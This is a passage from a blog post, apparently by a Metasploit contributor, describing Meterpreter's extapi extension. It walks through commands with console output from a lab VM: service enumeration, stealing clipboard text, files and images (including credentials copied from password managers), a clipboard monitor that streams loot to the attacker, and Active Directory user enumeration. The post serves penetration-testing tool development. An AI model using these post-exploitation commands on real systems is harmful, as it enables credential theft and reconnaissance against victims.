<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; service_enum
</span><span class='line'>
</span><span class='line'>Service List
</span><span class='line'>============
</span><span class='line'>
</span><span class='line'>PID   Status   Int  Name (Display Name)
</span><span class='line'>---   ------   ---  -------------------
</span><span class='line'>0     Stopped  N    alerter (Alerter)
</span><span class='line'>0     Stopped  N    alg (Application Layer Gateway Service)
</span><span class='line'>0     Stopped  N    appmgmt (Application Management)
</span><span class='line'>956   Running  N    audiosrv (Windows Audio)
</span><span class='line'>0     Stopped  N    bits (Background Intelligent Transfer Service)
</span><span class='line'>956   Running  N    browser (Computer Browser)
</span><span class='line'>0     Stopped  N    cisvc (Indexing Service)
</span><span class='line'>0     Stopped  N    clipsrv (ClipBook)
</span><span class='line'>0     Stopped  N    comsysapp (COM+ System Application)
</span><span class='line'>956   Running  N    cryptsvc (Cryptographic Services)
</span><span class='line'>956   Running  N    dhcp (DHCP Client)
</span><span class='line'>0     Stopped  N    dmadmin (Logical Disk Manager Administrative Service)
</span><span class='line'>0     Stopped  N    dmserver (Logical Disk Manager)
</span><span class='line'>1088  Running  N    dnscache (DNS Client)
</span><span class='line'>956   Running  N    ersvc (Error Reporting Service)
</span><span class='line'>640   Running  N    eventlog (Event Log)
</span><span class='line'>956   Running  N    eventsystem (COM+ Event System)
</span><span class='line'>0     Stopped  N    fastuserswitchingcompatibility (Fast User Switching Compatibility)
</span><span class='line'>956   Running  N    helpsvc (Help and Support)
</span><span class='line'>0     Stopped  N    hidserv (Human Interface Device Access)
</span><span class='line'>0     Stopped  N    imapiservice (IMAPI CD-Burning COM Service)
</span><span class='line'>956   Running  N    lanmanserver (Server)
</span><span class='line'>956   Running  N    lanmanworkstation (Workstation)
</span><span class='line'>1104  Running  N    lmhosts (TCP/IP NetBIOS Helper)
</span><span class='line'>0     Stopped  N    messenger (Messenger)
</span><span class='line'>0     Stopped  N    mnmsrvc (NetMeeting Remote Desktop Sharing)
</span><span class='line'>0     Stopped  N    msdtc (Distributed Transaction Coordinator)
</span><span class='line'>0     Stopped  N    msiserver (Windows Installer)
</span><span class='line'>0     Stopped  N    netdde (Network DDE)
</span><span class='line'>0     Stopped  N    netddedsdm (Network DDE DSDM)
</span><span class='line'>0     Stopped  N    netlogon (Net Logon)
</span><span class='line'>956   Running  N    netman (Network Connections)
</span><span class='line'>956   Running  N    nla (Network Location Awareness (NLA))
</span><span class='line'>0     Stopped  N    ntlmssp (NT LM Security Support Provider)
</span><span class='line'>0     Stopped  N    ntmssvc (Removable Storage)
</span><span class='line'>640   Running  N    plugplay (Plug and Play)
</span><span class='line'>652   Running  N    policyagent (IPSEC Services)
</span><span class='line'>652   Running  N    protectedstorage (Protected Storage)
</span><span class='line'>0     Stopped  N    rasauto (Remote Access Auto Connection Manager)
</span><span class='line'>0     Stopped  N    rasman (Remote Access Connection Manager)
</span><span class='line'>0     Stopped  N    rdsessmgr (Remote Desktop Help Session Manager)
</span><span class='line'>0     Stopped  N    remoteaccess (Routing and Remote Access)
</span><span class='line'>0     Stopped  N    rpclocator (Remote Procedure Call (RPC) Locator)
</span><span class='line'>856   Running  N    rpcss (Remote Procedure Call (RPC))
</span><span class='line'>0     Stopped  N    rsvp (QoS RSVP)
</span><span class='line'>652   Running  N    samss (Security Accounts Manager)
</span><span class='line'>0     Stopped  N    scarddrv (Smart Card Helper)
</span><span class='line'>0     Stopped  N    scardsvr (Smart Card)
</span><span class='line'>956   Running  N    schedule (Task Scheduler)
</span><span class='line'>956   Running  N    seclogon (Secondary Logon)
</span><span class='line'>956   Running  N    sens (System Event Notification)
</span><span class='line'>0     Stopped  N    sharedaccess (Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS))
</span><span class='line'>956   Running  N    shellhwdetection (Shell Hardware Detection)
</span><span class='line'>172   Running  N    spooler (Print Spooler)
</span><span class='line'>956   Running  N    srservice (System Restore Service)
</span><span class='line'>1104  Running  N    ssdpsrv (SSDP Discovery Service)
</span><span class='line'>0     Stopped  N    stisvc (Windows Image Acquisition (WIA))
</span><span class='line'>0     Stopped  N    swprv (MS Software Shadow Copy Provider)
</span><span class='line'>0     Stopped  N    sysmonlog (Performance Logs and Alerts)
</span><span class='line'>0     Stopped  N    tapisrv (Telephony)
</span><span class='line'>956   Running  N    termservice (Terminal Services)
</span><span class='line'>956   Running  N    themes (Themes)
</span><span class='line'>956   Running  N    trkwks (Distributed Link Tracking Client)
</span><span class='line'>956   Running  N    uploadmgr (Upload Manager)
</span><span class='line'>0     Stopped  N    upnphost (Universal Plug and Play Device Host)
</span><span class='line'>0     Stopped  N    ups (Uninterruptible Power Supply)
</span><span class='line'>1496  Running  N    vmtools (VMware Tools)
</span><span class='line'>808   Running  N    vmware physical disk helper service (VMware Physical Disk Helper Service)
</span><span class='line'>0     Stopped  N    vss (Volume Shadow Copy)
</span><span class='line'>956   Running  N    w32time (Windows Time)
</span><span class='line'>1104  Running  N    webclient (WebClient)
</span><span class='line'>956   Running  N    winmgmt (Windows Management Instrumentation)
</span><span class='line'>956   Running  N    wmdmpmsp (Portable Media Serial Number)
</span><span class='line'>0     Stopped  N    wmiapsrv (WMI Performance Adapter)
</span><span class='line'>0     Stopped  N    wuauserv (Automatic Updates)
</span><span class='line'>956   Running  N    wzcsvc (Wireless Zero Configuration)</span></code></pre></td></tr></table></div></figure>


<p>PIDs are shown so that the attacker can migrate to a chosen service easily using the <code>migrate &lt;pid&gt;</code> command. If the attacker is interested in more detail, then the <code>service_query</code> function can be used to dig deeper:</p>

<figure class='code'><figcaption><span>Detailed help for service_query</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; service_query -h
</span><span class='line'>
</span><span class='line'>Usage: service_query [-h] &lt;servicename&gt;
</span><span class='line'>     &lt;servicename&gt;:  The name of the service to query.
</span><span class='line'>
</span><span class='line'>Gets details information about a particular Windows service, including
</span><span class='line'>binary path, DACL, load order group, start type and more.</span></code></pre></td></tr></table></div></figure>


<p>The name of the service is required to drill deeper, and this is what it looks like when it&rsquo;s run:</p>

<figure class='code'><figcaption><span>Sample output of the service_query command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; service_query winmgmt
</span><span class='line'>
</span><span class='line'>Name        : winmgmt
</span><span class='line'>Display     : Windows Management Instrumentation
</span><span class='line'>Account     : LocalSystem
</span><span class='line'>Start Type  : Automatic
</span><span class='line'>Path        : C:\WINDOWS\system32\svchost.exe -k netsvcs
</span><span class='line'>L.O. Group  :
</span><span class='line'>Interactive : No
</span><span class='line'>DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)</span></code></pre></td></tr></table></div></figure>


<p>You&rsquo;ll notice that the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa446597(v=vs.85).aspx">DACL</a> hasn&rsquo;t been parsed into something easily digestable. This is a work in progress, as I&rsquo;m able to parse the DACL but can&rsquo;t yet come up with a nice way of rendering it. I&rsquo;m open to suggestions and pull requests!</p>

<h4>Clipboard Integration</h4>

<p>This is my favourite and the main motivation for starting the <code>extapi</code> extension in the first place.</p>

<figure class='code'><figcaption><span>Output from running &#8216;help&#8217; at the Meterpreter prompt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Extapi: Clipboard Management Commands
</span><span class='line'>=====================================
</span><span class='line'>
</span><span class='line'>    Command             Description
</span><span class='line'>    -------             -----------
</span><span class='line'>    clipboard_get_data  Read the victim's current clipboard
</span><span class='line'>    clipboard_set_text  Write text to the victim's clipboard</span></code></pre></td></tr></table></div></figure>


<p>Now we can at least partially own the clipboard, and it&rsquo;s contents. This opens up the possibility for snarfing credentials and other important information from the user while they&rsquo;re using the clipboard. One good example of this is when people are using password managers, such as KeypassX, to copy and paste credentials into browsers or applications.</p>

<p>The only problem is that I the functions need to be invoked manually, and at the right time. This can obviously be difficult and requires a bit of luck. The commands, which I will go into in just a minute, were designed to be the building blocks for me to build what I will call the <code>clipboard_monitor</code>!</p>

<p>But first, let&rsquo;s look at the bit of magic that let&rsquo;s us pull clipboard data from the victim.</p>

<figure class='code'><figcaption><span>Detailed help for the clipboard_get_data command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clipboard_get_data -h
</span><span class='line'>
</span><span class='line'>Usage: clipboard_get_data [-h] [-d]
</span><span class='line'>
</span><span class='line'>Attempts to read the data from the victim's clipboard. If the data is in a
</span><span class='line'>supported format, it is read and returned to the user.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -d &lt;opt&gt;  Download non-text content to the specified folder (or current folder)
</span><span class='line'>    -h        Help banner</span></code></pre></td></tr></table></div></figure>


<p>One thing to beard in mind about the clipboard is that it&rsquo;s not possible to tell what&rsquo;s on there without querying it. This is why I didn&rsquo;t create a <code>clipboard_get_text</code> function, for example, because the data might not be text. Instead, this general function will pull down whatever it finds on the clipboard so long as it&rsquo;s supported. Currently the extension supports the three main types: <strong>text</strong>, <strong>files</strong>, and <strong>images</strong>.</p>

<p>Text data is the most obvious and simple to handle. If we pretend that the user from the previous screenshot has copied the content of <code>notepad</code> to the clipboard, this is what we get:</p>

<figure class='code'><figcaption><span>Detailed help for the clipboard_get_data command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clipboard_get_data
</span><span class='line'>
</span><span class='line'>Current Clipboard Text
</span><span class='line'>======================
</span><span class='line'>
</span><span class='line'>This is secret!</span></code></pre></td></tr></table></div></figure>


<p>Pretty simple stuff. It does get more complicated when we want to deal with something like one or more files:</p>

<figure class='code'><figcaption><span>Detailed help for the clipboard_get_data command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clipboard_get_data
</span><span class='line'>
</span><span class='line'>Current Clipboard Files
</span><span class='line'>=======================
</span><span class='line'>
</span><span class='line'>File Path               Size (bytes)
</span><span class='line'>---------               ------------
</span><span class='line'>C:\Python27\NEWS.txt    263050
</span><span class='line'>C:\Python27\README.txt  54961
</span><span class='line'>C:\Python27\python.exe  26624
</span><span class='line'>
</span><span class='line'>3 file(s) totalling 344635 bytes</span></code></pre></td></tr></table></div></figure>


<p>Here we can see that the user has got a selection of files on the clipboard, and the extension lets us know what they are and how big they are. Directories are also supported, but displayed as a file with 0 bytes, like so:</p>

<figure class='code'><figcaption><span>Detailed help for the clipboard_get_data command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clipboard_get_data
</span><span class='line'>
</span><span class='line'>Current Clipboard Files
</span><span class='line'>=======================
</span><span class='line'>
</span><span class='line'>File Path               Size (bytes)
</span><span class='line'>---------               ------------
</span><span class='line'>C:\Python27\Doc         0
</span><span class='line'>C:\Python27\NEWS.txt    263050
</span><span class='line'>C:\Python27\README.txt  54961
</span><span class='line'>C:\Python27\python.exe  26624
</span><span class='line'>
</span><span class='line'>4 file(s) totalling 344635 bytes</span></code></pre></td></tr></table></div></figure>


<p>This might change in future, but for now this is how it works. Doing a recursive file stat to get counts of files and files sizes was deemed overkill for the sake of this exercise.</p>

<p>While this output is interesting, it&rsquo;d be more useful to be able to download those files as well. This is where the <code>-d</code> switch comes in, as this tells the extension to download the files to the local machine:</p>

<figure class='code'><figcaption><span>Download files using the -d switch</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clipboard_get_data -d
</span><span class='line'>
</span><span class='line'>[*] Downloading Clipboard Files ...
</span><span class='line'>downloading: C:\Python27\README.txt -&gt; /Users/oj/code/metasploit-framework/README.txt
</span><span class='line'>downloaded : C:\Python27\README.txt -&gt; /Users/oj/code/metasploit-framework/README.txt
</span><span class='line'>downloading: C:\Python27\Doc\python271.chm -&gt; /Users/oj/code/metasploit-framework/Doc/python271.chm
</span><span class='line'>downloaded : C:\Python27\Doc\python271.chm -&gt; /Users/oj/code/metasploit-framework/Doc/python271.chm
</span><span class='line'>downloading: C:\Python27\NEWS.txt -&gt; /Users/oj/code/metasploit-framework/NEWS.txt
</span><span class='line'>downloaded : C:\Python27\NEWS.txt -&gt; /Users/oj/code/metasploit-framework/NEWS.txt
</span><span class='line'>downloading: C:\Python27\python.exe -&gt; /Users/oj/code/metasploit-framework/python.exe
</span><span class='line'>downloaded : C:\Python27\python.exe -&gt; /Users/oj/code/metasploit-framework/python.exe
</span><span class='line'>[+] Downloaded 4 file(s).</span></code></pre></td></tr></table></div></figure>


<p>Here you can see that download does work recursively. So we can deal with text and files, what about image data? What if someone takes a screenshot of something?</p>

<figure class='code'><figcaption><span>Image data</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clipboard_get_data
</span><span class='line'>
</span><span class='line'>Clipboard Image Dimensions: 240x180
</span><span class='line'>Re-run with -d to download image.</span></code></pre></td></tr></table></div></figure>


<p>The extension tells us that there is image data on the clipboard, and that again we can use the <code>-d</code> switch to pull the data down:</p>

<figure class='code'><figcaption><span>Download image data with -d</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Clipboard Image Dimensions: 240x180
</span><span class='line'>[+] Clipboard image saved to /Users/oj/code/metasploit-framework/ZoepvBYT.jpg</span></code></pre></td></tr></table></div></figure>


<p>Images are captured by Meterpreter, compressed to JPG using <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms533798(v=vs.85).aspx">GDI+</a>, and shipped down to the attacker&rsquo;s machine in the usual manner. This does mean that machines that are Windows 2000 SP3 or earlier can&rsquo;t work with the image downloader, because they don&rsquo;t have GDI+ installed. This probably isn&rsquo;t going to be a big problem given the number of machines out there that fit this description. Down the track, I plan to update the built-in screenshot utility to use GDI+ as well.</p>

<p>Now if only we could do all this automatically when the clipboard content changes. Fear not, dear reader! This is a work in progress.</p>

<figure class='code'><figcaption><span>Sample clipboard_monitor help</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clipboard_monitor
</span><span class='line'> 
</span><span class='line'>Usage: clipboard_monitor &lt;start|pause|resume|stop&gt; [-f] [-i] [-h]
</span><span class='line'> 
</span><span class='line'>Starts or stops a background clipboard monitoring thread. The thread watches
</span><span class='line'>the clipboard on the target, under the context of the current desktop, and when
</span><span class='line'>changes are detected the contents of the clipboard are returned to the attacker.
</span><span class='line'> 
</span><span class='line'>  - start  - starts the clipboard monitor with the given arguments if
</span><span class='line'>             the thread is not already running.
</span><span class='line'>  - pause  - pauses a currently running clipboard monitor thread.
</span><span class='line'>  - resume - resumes a currently paused clipboard monitor thread.
</span><span class='line'>  - stop   - stops a currently running or paused clipboard monitor thread.
</span><span class='line'> 
</span><span class='line'>OPTIONS:
</span><span class='line'> 
</span><span class='line'>    -f        Automatically download files
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -i        Automatically download image content
</span><span class='line'>    -l &lt;opt&gt;  Specifies the folder to write the clipboard loot to
</span><span class='line'> 
</span><span class='line'> 
</span><span class='line'>meterpreter &gt; clipboard_monitor start -l /tmp
</span><span class='line'>[*] Clipboard monitor looting to /tmp ...
</span><span class='line'>[*] Download files? No
</span><span class='line'>[*] Download images? No
</span><span class='line'>[+] Clipboard monitor started</span></code></pre></td></tr></table></div></figure>


<p>As you can see, some work has been done already. Capturing the clipboard changes has already been implemented, but rather than buffer them on the victim&rsquo;s machine the goal is to create a streaming mechanism that will push the data to the attacker as soon as possible. This prevents issues with memory usage on the client, it means that information is made available as it happens, and it also removes the possibility of data being lost if the user manages to terminate Meterpreter.</p>

<p>This work will also go towards supporting streaming for other helpful Meterpreter features such as keylogging and packet capture.</p>

<p>The final command, <code>clipboard_set_text</code>, is a bit of a cute novelty that fits into the same category as some other Metasploit features in that it&rsquo;s used to scare the victim a little. Setting text is the only thing that is supported, image content and files <em>might</em> come later but are currently a very low priority.</p>

<figure class='code'><figcaption><span>Set text example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; clipboard_set_text You have been owned!
</span><span class='line'>meterpreter &gt; clipboard_get_data
</span><span class='line'>
</span><span class='line'>Current Clipboard Text
</span><span class='line'>======================
</span><span class='line'>
</span><span class='line'>You have been owned!</span></code></pre></td></tr></table></div></figure>


<p>This rather large chunk of work was merged by <a href="https://twitter.com/egyp7">Egypt</a> and <a href="https://twitter.com/Meatballs__">Meatballs</a>, who deserve a big thanks for wading through my steaming pile of code to make sure it was as stink-free as possible before it landed in master.</p>

<h4>ADSI Integration</h4>

<p>ADSI support isn&rsquo;t currently in the <code>extapi</code> extension that is sitting in Metasploit&rsquo;s master branch. However, there are pull requests for both <a href="https://github.com/rapid7/meterpreter/pull/60">Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/pull/2736">Metasploit</a> which add the very basics for querying Active Directory through Meterpreter.</p>

<figure class='code'><figcaption><span>ADSI commands</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Extapi: ADSI Management Commands
</span><span class='line'>================================
</span><span class='line'>
</span><span class='line'>    Command             Description
</span><span class='line'>    -------             -----------
</span><span class='line'>    adsi_computer_enum  Enumerate all computers on the specified domain.
</span><span class='line'>    adsi_domain_query   Enumerate all objects on the specified domain that match a filter.
</span><span class='line'>    adsi_user_enum      Enumerate all users on the specified domain.</span></code></pre></td></tr></table></div></figure>


<p>The core of the work that has been done is in the <code>adsi_domain_query</code> command, as this is the general funnel that is used by the other two commands. It looks like this:</p>

<figure class='code'><figcaption><span>ADSI commands</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; adsi_domain_query 
</span><span class='line'>
</span><span class='line'>Usage: adsi_domain_query &lt;domain&gt; &lt;filter&gt; &lt;field 1&gt; [field 2 [field ..]] [-h] [-m maxresults] [-p pagesize]
</span><span class='line'>
</span><span class='line'>Enumerate the objects on the target domain.
</span><span class='line'>
</span><span class='line'>Enumeration returns the set of fields that are specified.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -m &lt;opt&gt;  Maximum results to return.
</span><span class='line'>    -p &lt;opt&gt;  Result set page size.
</span></code></pre></td></tr></table></div></figure>


<p>Those familiar with LDAP, Active Directory, etc. will be familiar with how this works. As we all know, a console dump speaks volumes, so let&rsquo;s see an example of it being invoked against my old Windows 2000 domain controller VM:</p>

<figure class='code'><figcaption><span>adsi_domain_query command sample</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; adsi_domain_query windows.old "(|(name=w*)(name=a*))" samaccountname name distinguishedname
</span><span class='line'>
</span><span class='line'>windows.old Objects
</span><span class='line'>===================
</span><span class='line'>
</span><span class='line'>samaccountname     name                distinguishedname
</span><span class='line'>--------------     ----                -----------------
</span><span class='line'>                   a.root-servers.net  DC=a.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
</span><span class='line'>                   WinsockServices     CN=WinsockServices,CN=System,DC=windows,DC=old
</span><span class='line'>                   windows.old         DC=windows.old,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
</span><span class='line'>                   windows             DC=windows,DC=old
</span><span class='line'>                   AdminSDHolder       CN=AdminSDHolder,CN=System,DC=windows,DC=old
</span><span class='line'>                   win2k               DC=win2k,DC=windows.old,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
</span><span class='line'>                   WIN2K               CN=WIN2K,CN=Domain System Volume (SYSVOL share),CN=File Replication Service,CN=System,DC=windows,DC=old
</span><span class='line'>                   AppCategories       CN=AppCategories,CN=Default Domain Policy,CN=System,DC=windows,DC=old
</span><span class='line'>Account Operators  Account Operators   CN=Account Operators,CN=Builtin,DC=windows,DC=old
</span><span class='line'>Administrator      Administrator       CN=Administrator,CN=Users,DC=windows,DC=old
</span><span class='line'>Administrators     Administrators      CN=Administrators,CN=Builtin,DC=windows,DC=old
</span><span class='line'>WIN2K$             WIN2K               CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old
</span><span class='line'>alice              Alice               CN=Alice,CN=Users,DC=windows,DC=old
</span><span class='line'>
</span><span class='line'>Total objects: 13</span></code></pre></td></tr></table></div></figure>


<p>You can see that I&rsquo;m searching for any objects in the <code>windows.old</code> domain that have a name starting with <code>w</code> or <code>a</code> and I&rsquo;m asking for the fields <code>samaccountname</code>, <code>name</code> and <code>distinguishedname</code>.</p>

<p>Here&rsquo;s a query for user&rsquo;s that have a name starting with <code>a</code> that lets us know how many attempts they&rsquo;ve had at logging in that have failed:</p>

<figure class='code'><figcaption><span>adsi_domain_query command sample</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; adsi_domain_query windows.old "(&(objectClass=user)(name=a*))" samaccountname badPwdCount
</span><span class='line'>
</span><span class='line'>windows.old Objects
</span><span class='line'>===================
</span><span class='line'>
</span><span class='line'>samaccountname  badPwdCount
</span><span class='line'>--------------  -----------
</span><span class='line'>Administrator   9
</span><span class='line'>alice           0
</span><span class='line'>
</span><span class='line'>Total objects: 2</span></code></pre></td></tr></table></div></figure>


<p>With this in place, lots of pre-baked queries can be made that can sit on top and not require much work. I&rsquo;ve put two in there already, just as examples, and they look like this:</p>

<figure class='code'><figcaption><span>adsi_user_enum output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; adsi_user_enum
</span><span class='line'>
</span><span class='line'>Usage: adsi_user_enum &lt;domain&gt; [-h] [-m maxresults] [-p pagesize]
</span><span class='line'>
</span><span class='line'>Enumerate the users on the target domain.
</span><span class='line'>
</span><span class='line'>Enumeration returns information such as the user name, SAM account name, locked
</span><span class='line'>status, desc, and comment.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -m &lt;opt&gt;  Maximum results to return.
</span><span class='line'>    -p &lt;opt&gt;  Result set page size.
</span><span class='line'>
</span><span class='line'>meterpreter &gt; adsi_user_enum windows.old
</span><span class='line'>
</span><span class='line'>windows.old Users
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>samaccountname  name            distinguishedname                                 description                                                                              comment
</span><span class='line'>--------------  ----            -----------------                                 -----------                                                                              -------
</span><span class='line'>Administrator   Administrator   CN=Administrator,CN=Users,DC=windows,DC=old       Built-in account for administering the computer/domain                                   
